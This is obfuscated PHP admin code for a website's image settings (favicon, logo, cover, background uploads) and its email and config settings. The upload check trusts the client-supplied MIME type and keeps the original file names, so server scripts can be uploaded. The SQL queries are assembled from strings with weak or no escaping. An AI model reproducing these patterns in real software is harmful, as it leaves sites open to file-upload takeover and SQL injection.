    exit('<script language="JavaScript">;alert("请上传5MB以内的图片!");location.href="../imgset.php";</script>;');
}
$sql="select * from admin where id= '1'";
$fileExists=mysqli_query($conn, $sql);
$result=$fileExists;
$fileExists=mysqli_num_rows($result);
$tmp=$fileExists>0;
if($tmp)goto L2xeWjgxec;
goto L2xldMhxec;
goto L2xldMhxec;
L2xeWjgxec:
$fileExists=mysqli_fetch_assoc($result);
$row=$fileExists;
$bdhomebjt='../.' . $row["icon"];
$fileExists=strstr($bdhomebjt, "/user/pubces");
if($fileExists)goto L2xeWjgxee;
goto L2xxeb;
goto L2xxeb;
L2xeWjgxee:
$fileExists=file_exists($bdhomebjt);
if($fileExists)goto L2xeWjgxeg;
goto L2xxeb;
goto L2xxeb;
L2xeWjgxeg:
$fileExists=unlink($bdhomebjt);
goto L2xxeb;
L2xldMhxec:
L2xxeb:
$path="../../user/pubces/";
$escaped=uniqid();
$cookieResult=hexdec($escaped);
$rand=rand();
$tmp=$cookieResult . $rand;
$escaped4=md5($zjzhq);
$tmp3=$tmp . $escaped4;
$dateStr=date("YmdHis");
$tmp2=$tmp3 . $dateStr;
$file_name=$tmp2 . $file["name"];
$file_path=$path . $file_name;
$userimg="./user/pubces/" . $file_name;
$isArray=is_array($file);
if($isArray){
    $file2=&$file["tmp_name"];
}else{
    $file2=$file["tmp_name"];
}
$fileExists=move_uploaded_file($file2, $file_path);
unset($file2);
if($fileExists)goto L2xeWjgxek;
goto L2xldMhxek;
goto L2xldMhxek;
L2xeWjgxek:
$tmp="UPDATE admin SET icon='" . $userimg;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xeWjgxem;
goto L2xxen;
goto L2xxen;
L2xeWjgxem:
echo '<script language="JavaScript">;location.href="../imgset.php";</script>;';
goto L2xxen;
L2xldMhxek:
echo '<script language="JavaScript">;alert("Favicon图标更新失败");location.href="../imgset.php";</script>;';
L2xldMhxeo:
L2xxen:
if($lx=="logo")goto L2xeWjgxhf;
goto L2xldMhxhf;
L2xeWjgxhf:
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['logourl'];
}else{
    $lx=$_POST['logourl'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$logourl=$escaped3;
$tmp=$logourl!="";
if($tmp)goto L2xeWjgxg6;
goto L2xldMhxg6;
goto L2xldMhxg6;
L2xeWjgxg6:
$sql="select * from admin where id= '1'";
$fileExists=mysqli_query($conn, $sql);
$result=$fileExists;
$fileExists=mysqli_num_rows($result);
$tmp=$fileExists>0;
if($tmp)goto L2xeWjgxg8;
goto L2xldMhxg8;
goto L2xldMhxg8;
L2xeWjgxg8:
$fileExists=mysqli_fetch_assoc($result);
$row=$fileExists;
$bdhomebjt='../.' . $row["logo"];
$fileExists=strstr($bdhomebjt, "/user/pubces");
if($fileExists)goto L2xeWjgxga;
goto L2xxg7;
goto L2xxg7;
L2xeWjgxga:
$fileExists=file_exists($bdhomebjt);
if($fileExists)goto L2xeWjgxgc;
goto L2xxg7;
goto L2xxg7;
L2xeWjgxgc:
$fileExists=unlink($bdhomebjt);
goto L2xxg7;
L2xldMhxg8:
L2xxg7:
$tmp="UPDATE admin SET logo='" . $logourl;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xeWjgxge;
goto L2xldMhxge;
goto L2xldMhxge;
L2xeWjgxge:
exit('<script language="JavaScript">;location.href="../imgset.php";</script>;');
goto L2xxg5;
L2xldMhxge:
exit('<script language="JavaScript">;alert("Logo图标更新失败");location.href="../imgset.php";</script>;');
L2xldMhxg6:
L2xxg5:
$str="../../user/";
$fileExists=iconv("UTF-8", "GBK", $str);
$dir=$fileExists;
$fileExists=file_exists($dir);
$tmp=!$fileExists;
if($tmp){
    $fileExists=mkdir($dir, true);
}
$str="../../user/pubces/";
$fileExists=iconv("UTF-8", "GBK", $str);
$dir=$fileExists;
$fileExists=file_exists($dir);
$tmp=!$fileExists;
if($tmp){
    $fileExists=mkdir($dir, true);
}
$file=$_FILES['file'];
$val[]="gif";
$val[]="jpeg";
$val[]="jpg";
$val[]="png";
$allowedExts=$val;
$escaped4=is_array($_FILES);
if($escaped4){
    $file=&$_FILES["file"];
}else{
    $file=$_FILES["file"];
}
$isArray=is_array($file);
unset($file);
if($isArray){
    $file2=&$_FILES["file"]["name"];
}else{
    $file2=$_FILES["file"]["name"];
}
$fileExists=explode(".", $file2);
unset($file2);
$temp=$fileExists;
$fileExists=end($temp);
$extension=$fileExists;
$tmp=$extension=='';
if($tmp){
    exit('<script language="JavaScript">;alert("未选择图片!");location.href="../imgset.php";</script>;');
}
$tmp=$file['type']=='image/jpeg';
$tmp2=(bool)$tmp;
$tmp5=!$tmp2;
if($tmp5){
    $tmp3=$file['type']=='image/png';
    $tmp2=(bool)$tmp3;
}
$tmp6=(bool)$tmp2;
$tmp7=!$tmp6;
if($tmp7){
    $tmp4=$file['type']=='image/jpg';
    $tmp6=(bool)$tmp4;
}
$tmp8=(bool)$tmp6;
$tmp9=!$tmp8;
if($tmp9){
    $tmp10=$file['type']=='image/gif';
    $tmp11=(bool)$tmp10;
    if($tmp11){
        $fileExists=in_array($extension, $allowedExts);
        $tmp11=(bool)$fileExists;
    }
    $tmp8=(bool)$tmp11;
}
if($tmp8)goto L2xxgp;
goto L2xldMhxgy;
L2xldMhxgy:
exit('<script language="JavaScript">;alert("文件类型错误,请上传图片!");location.href="../imgset.php";</script>;');
L2xxgp:
$tmp=$file["size"]>5242880;
if($tmp){
    exit('<script language="JavaScript">;alert("请上传5MB以内的图片!");location.href="../imgset.php";</script>;');
}
$sql="select * from admin where id= '1'";
$fileExists=mysqli_query($conn, $sql);
$result=$fileExists;
$fileExists=mysqli_num_rows($result);
$tmp=$fileExists>0;
if($tmp)goto L2xeWjgxh3;
goto L2xldMhxh3;
goto L2xldMhxh3;
L2xeWjgxh3:
$fileExists=mysqli_fetch_assoc($result);
$row=$fileExists;
$bdhomebjt='../.' . $row["logo"];
$fileExists=strstr($bdhomebjt, "/user/pubces");
if($fileExists)goto L2xeWjgxh5;
goto L2xxh2;
goto L2xxh2;
L2xeWjgxh5:
$fileExists=file_exists($bdhomebjt);
if($fileExists)goto L2xeWjgxh7;
goto L2xxh2;
goto L2xxh2;
L2xeWjgxh7:
$fileExists=unlink($bdhomebjt);
goto L2xxh2;
L2xldMhxh3:
L2xxh2:
$path="../../user/pubces/";
$escaped=uniqid();
$cookieResult=hexdec($escaped);
$rand=rand();
$tmp=$cookieResult . $rand;
$escaped4=md5($zjzhq);
$tmp3=$tmp . $escaped4;
$dateStr=date("YmdHis");
$tmp2=$tmp3 . $dateStr;
$file_name=$tmp2 . $file["name"];
$file_path=$path . $file_name;
$userimg="./user/pubces/" . $file_name;
$isArray=is_array($file);
if($isArray){
    $file2=&$file["tmp_name"];
}else{
    $file2=$file["tmp_name"];
}
$fileExists=move_uploaded_file($file2, $file_path);
unset($file2);
if($fileExists)goto L2xeWjgxhb;
goto L2xldMhxhb;
goto L2xldMhxhb;
L2xeWjgxhb:
$tmp="UPDATE admin SET logo='" . $userimg;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xeWjgxhd;
goto L2xxhe;
goto L2xxhe;
L2xeWjgxhd:
echo '<script language="JavaScript">;location.href="../imgset.php";</script>;';
goto L2xxhe;
L2xldMhxhb:
echo '<script language="JavaScript">;alert("Logo图标更新失败");location.href="../imgset.php";</script>;';
L2xldMhxhf:
L2xxhe:
if($lx=="coverimg")goto L2xeWjgxk6;
goto L2xldMhxk6;
L2xeWjgxk6:
$isArray=is_array($_POST);
if($isArray){
    $lx=&$_POST['coverimgurl'];
}else{
    $lx=$_POST['coverimgurl'];
}
$escaped=htmlspecialchars($lx);
unset($lx);
$escaped3=addslashes($escaped);
$coverimgurl=$escaped3;
$tmp=$coverimgurl!="";
if($tmp)goto L2xeWjgxiw;
goto L2xldMhxiw;
goto L2xldMhxiw;
L2xeWjgxiw:
$sql="select * from admin where id= '1'";
$fileExists=mysqli_query($conn, $sql);
$result=$fileExists;
$fileExists=mysqli_num_rows($result);
$tmp=$fileExists>0;
if($tmp)goto L2xeWjgxiy;
goto L2xldMhxiy;
goto L2xldMhxiy;
L2xeWjgxiy:
$fileExists=mysqli_fetch_assoc($result);
$row=$fileExists;
$bdhomebjt='../.' . $row["homimg"];
$fileExists=strstr($bdhomebjt, "/user/pubces");
if($fileExists)goto L2xeWjgxj1;
goto L2xxix;
goto L2xxix;
L2xeWjgxj1:
$fileExists=file_exists($bdhomebjt);
if($fileExists)goto L2xeWjgxj3;
goto L2xxix;
goto L2xxix;
L2xeWjgxj3:
$fileExists=unlink($bdhomebjt);
goto L2xxix;
L2xldMhxiy:
L2xxix:
$tmp="UPDATE admin SET homimg='" . $coverimgurl;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xeWjgxj5;
goto L2xldMhxj5;
goto L2xldMhxj5;
L2xeWjgxj5:
exit('<script language="JavaScript">;location.href="../imgset.php";</script>;');
goto L2xxiv;
L2xldMhxj5:
exit('<script language="JavaScript">;alert("相册封面更新失败");location.href="../imgset.php";</script>;');
L2xldMhxiw:
L2xxiv:
$str="../../user/";
$fileExists=iconv("UTF-8", "GBK", $str);
$dir=$fileExists;
$fileExists=file_exists($dir);
$tmp=!$fileExists;
if($tmp){
    $fileExists=mkdir($dir, true);
}
$str="../../user/pubces/";
$fileExists=iconv("UTF-8", "GBK", $str);
$dir=$fileExists;
$fileExists=file_exists($dir);
$tmp=!$fileExists;
if($tmp){
    $fileExists=mkdir($dir, true);
}
$file=$_FILES['file'];
$val[]="gif";
$val[]="jpeg";
$val[]="jpg";
$val[]="png";
$allowedExts=$val;
$escaped4=is_array($_FILES);
if($escaped4){
    $file=&$_FILES["file"];
}else{
    $file=$_FILES["file"];
}
$isArray=is_array($file);
unset($file);
if($isArray){
    $file2=&$_FILES["file"]["name"];
}else{
    $file2=$_FILES["file"]["name"];
}
$fileExists=explode(".", $file2);
unset($file2);
$temp=$fileExists;
$fileExists=end($temp);
$extension=$fileExists;
$tmp=$extension=='';
if($tmp){
    exit('<script language="JavaScript">;alert("未选择图片!");location.href="../imgset.php";</script>;');
}
$tmp=$file['type']=='image/jpeg';
$tmp2=(bool)$tmp;
$tmp5=!$tmp2;
if($tmp5){
    $tmp3=$file['type']=='image/png';
    $tmp2=(bool)$tmp3;
}
$tmp6=(bool)$tmp2;
$tmp7=!$tmp6;
if($tmp7){
    $tmp4=$file['type']=='image/jpg';
    $tmp6=(bool)$tmp4;
}
$tmp8=(bool)$tmp6;
$tmp9=!$tmp8;
if($tmp9){
    $tmp10=$file['type']=='image/gif';
    $tmp11=(bool)$tmp10;
    if($tmp11){
        $fileExists=in_array($extension, $allowedExts);
        $tmp11=(bool)$fileExists;
    }
    $tmp8=(bool)$tmp11;
}
if($tmp8)goto L2xxjg;
goto L2xldMhxjp;
L2xldMhxjp:
exit('<script language="JavaScript">;alert("文件类型错误,请上传图片!");location.href="../imgset.php";</script>;');
L2xxjg:
$tmp=$file["size"]>5242880;
if($tmp){
    exit('<script language="JavaScript">;alert("请上传5MB以内的图片!");location.href="../imgset.php";</script>;');
}
$sql="select * from admin where id= '1'";
$fileExists=mysqli_query($conn, $sql);
$result=$fileExists;
$fileExists=mysqli_num_rows($result);
$tmp=$fileExists>0;
if($tmp)goto L2xeWjgxjt;
goto L2xldMhxjt;
goto L2xldMhxjt;
L2xeWjgxjt:
$fileExists=mysqli_fetch_assoc($result);
$row=$fileExists;
$bdhomebjt='../.' . $row["homimg"];
$fileExists=strstr($bdhomebjt, "/user/pubces");
if($fileExists)goto L2xeWjgxjv;
goto L2xxjs;
goto L2xxjs;
L2xeWjgxjv:
$fileExists=file_exists($bdhomebjt);
if($fileExists)goto L2xeWjgxjx;
goto L2xxjs;
goto L2xxjs;
L2xeWjgxjx:
$fileExists=unlink($bdhomebjt);
goto L2xxjs;
L2xldMhxjt:
L2xxjs:
$path="../../user/pubces/";
$escaped=uniqid();
$cookieResult=hexdec($escaped);
$rand=rand();
$tmp=$cookieResult . $rand;
$escaped4=md5($zjzhq);
$tmp3=$tmp . $escaped4;
$dateStr=date("YmdHis");
$tmp2=$tmp3 . $dateStr;
$file_name=$tmp2 . $file["name"];
$file_path=$path . $file_name;
$userimg="./user/pubces/" . $file_name;
$isArray=is_array($file);
if($isArray){
    $file2=&$file["tmp_name"];
}else{
    $file2=$file["tmp_name"];
}
$fileExists=move_uploaded_file($file2, $file_path);
unset($file2);
if($fileExists)goto L2xeWjgxk2;
goto L2xldMhxk2;
goto L2xldMhxk2;
L2xeWjgxk2:
$tmp="UPDATE admin SET homimg='" . $userimg;
$sql=$tmp . "' WHERE id='1'";
$result=$conn->query($sql);
$result=$result;
if($result)goto L2xeWjgxk4;
goto L2xxk5;
goto L2xxk5;
L2xeWjgxk4:
echo '<script language="JavaScript">;location.href="../imgset.php";</script>;';
goto L2xxk5;
L2xldMhxk2:
echo '<script language="JavaScript">;alert("相册封面更新失败");location.href="../imgset.php";</script>;';
L2xldMhxk6:
L2xxk5:
if($lx=="bobgsc")goto L2xeWjgxma;
goto L2xldMhxma;
L2xeWjgxma:
$str="../../user/bobg/";
$fileExists=iconv("UTF-8", "GBK", $str);
$dir=$fileExists;
$fileExists=file_exists($dir);
$tmp=!$fileExists;
if($tmp){
    $fileExists=mkdir($dir, true);
}
$file=$_FILES['file'];
$val[]="gif";
$val[]="jpeg";
$val[]="jpg";
$val[]="png";
$allowedExts=$val;
$escaped4=is_array($_FILES);
if($escaped4){
    $file=&$_FILES["file"];
}else{
    $file=$_FILES["file"];
}
$isArray=is_array($file);
unset($file);
if($isArray){
    $file2=&$_FILES["file"]["name"];
}else{
    $file2=$_FILES["file"]["name"];
}
$fileExists=explode(".", $file2);
unset($file2);
$temp=$fileExists;
$fileExists=end($temp);
$extension=$fileExists;
$tmp=$extension=='';
if($tmp){
    exit('<script language="JavaScript">;alert("未选择图片!");location.href="../imgset.php";</script>;');
}
$tmp=$file['type']=='image/jpeg';
$tmp2=(bool)$tmp;
$tmp5=!$tmp2;
if($tmp5){
    $tmp3=$file['type']=='image/png';
    $tmp2=(bool)$tmp3;
}
$tmp6=(bool)$tmp2;
$tmp7=!$tmp6;
if($tmp7){
    $tmp4=$file['type']=='image/jpg';
    $tmp6=(bool)$tmp4;
}
$tmp8=(bool)$tmp6;
$tmp9=!$tmp8;
if($tmp9){
    $tmp10=$file['type']=='image/gif';
    $tmp11=(bool)$tmp10;
    if($tmp11){
        $fileExists=in_array($extension, $allowedExts);
        $tmp11=(bool)$fileExists;
    }
    $tmp8=(bool)$tmp11;
}
if($tmp8)goto L2xxls;
goto L2xldMhxm2;
L2xldMhxm2:
exit('<script language="JavaScript">;alert("文件类型错误,请上传图片!");location.href="../imgset.php";</script>;');
L2xxls:
$tmp=$file["size"]>5242880;
if($tmp){
    exit('<script language="JavaScript">;alert("请上传5MB以内的图片!");location.href="../imgset.php";</script>;');
}
$str="../../user/bobg/bobg." . $extension;
$isArray=is_array($file);
if($isArray){
    $file2=&$file["tmp_name"];
}else{
    $file2=$file["tmp_name"];
}
$fileExists=move_uploaded_file($file2, $str);
unset($file2);
if($fileExists)goto L2xeWjgxm8;
goto L2xldMhxm8;
goto L2xldMhxm8;
L2xeWjgxm8:
echo '<script language="JavaScript">;location.href="../imgset.php";</script>;';
goto L2xxm9;
L2xldMhxm8:
echo '<script language="JavaScript">;alert("网页背景图上传失败");location.href="../imgset.php";</script>;';
L2xldMhxma:
L2xxm9:
if($lx=="bobgde")goto L2xeWjgxn8;
goto L2xldMhxn8;
L2xeWjgxn8:
$fileExists=file_exists("../../user/bobg/bobg.png");
if($fileExists)goto L2xeWjgxn3;
goto L2xldMhxn3;
goto L2xldMhxn3;
L2xeWjgxn3:
$fileExists=unlink("../../user/bobg/bobg.png");
echo '<script language="JavaScript">;alert("已删除现有网页背景图!");location.href="../imgset.php";</script>;';
goto L2xxn7;
L2xldMhxn3:
$fileExists=file_exists("../../user/bobg/bobg.jpg");
if($fileExists)goto L2xeWjgxn4;
goto L2xldMhxn4;
goto L2xldMhxn4;
L2xeWjgxn4:
$fileExists=unlink("../../user/bobg/bobg.jpg");
echo '<script language="JavaScript">;alert("已删除现有网页背景图!");location.href="../imgset.php";</script>;';
goto L2xxn7;
L2xldMhxn4:
$fileExists=file_exists("../../user/bobg/bobg.jpeg");
if($fileExists)goto L2xeWjgxn5;
goto L2xldMhxn5;
goto L2xldMhxn5;
L2xeWjgxn5:
$fileExists=unlink("../../user/bobg/bobg.jpeg");
echo '<script language="JavaScript">;alert("已删除现有网页背景图!");location.href="../imgset.php";</script>;';
goto L2xxn7;
L2xldMhxn5:
$fileExists=file_exists("../../user/bobg/bobg.gif");
if($fileExists)goto L2xeWjgxn6;
goto L2xldMhxn6;
goto L2xldMhxn6;
L2xeWjgxn6:
$fileExists=unlink("../../user/bobg/bobg.gif");
echo '<script language="JavaScript">;alert("已删除现有网页背景图!");location.href="../imgset.php";</script>;';
goto L2xxn7;
L2xldMhxn6:
echo '<script language="JavaScript">;alert("当前没有网页背景图!");location.href="../imgset.php";</script>;';
L2xldMhxn8:
L2xxn7:
if($lx=="emailset"){
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['emdz'];
    }else{
        $lx=$_POST['emdz'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $emdz=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['emssl'];
    }else{
        $lx=$_POST['emssl'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $emssl=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['emdk'];
    }else{
        $lx=$_POST['emdk'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $emdk=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['emkey'];
    }else{
        $lx=$_POST['emkey'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $emkey=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['emfzh'];
    }else{
        $lx=$_POST['emfzh'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $emfzh=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['emfsy'];
    }else{
        $lx=$_POST['emfsy'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $emfsy=$escaped3;
    $isArray=is_array($_POST);
    if($isArray){
        $lx=&$_POST['emfsm'];
    }else{
        $lx=$_POST['emfsm'];
    }
    $escaped=htmlspecialchars($lx);
    unset($lx);
    $escaped3=addslashes($escaped);
    $emfsm=$escaped3;
    $tmp=$emdz!="";
    if($tmp){
        $tmp="UPDATE admin SET emydz='" . $emdz;
        $sql=$tmp . "' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $tmp=$emssl!="";
    if($tmp){
        $tmp="UPDATE admin SET emssl='" . $emssl;
        $sql=$tmp . "' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $tmp=$emdk!="";
    if($tmp){
        $tmp="UPDATE admin SET emduk='" . $emdk;
        $sql=$tmp . "' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $tmp=$emkey!="";
    if($tmp){
        $tmp="UPDATE admin SET emkey='" . $emkey;
        $sql=$tmp . "' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $tmp=$emfzh!="";
    if($tmp){
        $tmp="UPDATE admin SET emzh='" . $emfzh;
        $sql=$tmp . "' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $tmp=$emfsy!="";
    if($tmp){
        $tmp="UPDATE admin SET emfs='" . $emfsy;
        $sql=$tmp . "' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    $tmp=$emfsm!="";
    if($tmp){
        $tmp="UPDATE admin SET emfszm='" . $emfsm;
        $sql=$tmp . "' WHERE id='1'";
        $result=$conn->query($sql);
        $result=$result;
    }
    echo '<script language="JavaScript">;location.href="../emailset.php";</script>;';
}
$result=$conn->close();
unset($val2);function examine($title,$text,$conn,$exa) {
if($text=="")goto L2xeWjgxq5;
goto L2xldMhxq5;
L2xeWjgxq5:
    $tmp=$exa=="no";
if($tmp)goto L2xeWjgxq3;
goto L2xxq4;
goto L2xxq4;
L2xeWjgxq3:
    return ;
goto L2xxq4;
L2xldMhxq5:
L2xxq4:
    $tmp="SELECT * FROM configx WHERE title = '" . $title;
    $sql=$tmp . "'";
    $result=$conn->query($sql);
    $result=$result;
    $num=8014;
    $tmp3=(bool)$result;
    if($tmp3){
        $fileExists=mysqli_num_rows($result);
        $tmp=$fileExists>0;
        $tmp3=(bool)$tmp;
    }
    if($tmp3){
        $num=182;
    }else{
        $num=112;
    }
    switch($num){
        case 112:{
        $tmp="INSERT INTO configx (title, text) VALUES ('" . $title;
        $tmp3=$tmp . "', '";
        $tmp2=$tmp3 . $text;
        $sql=$tmp2 . "')";
        $result=$conn->query($sql);
        $result=$result;
            break;
        }
        case 182:{
            $tmp="UPDATE configx SET text = '" . $text;
            $tmp3=$tmp . "' WHERE title = '";
            $tmp2=$tmp3 . $title;
            $sql=$tmp2 . "'";
            $result=$conn->query($sql);
            $result=$result;
            break;
        }
    }
}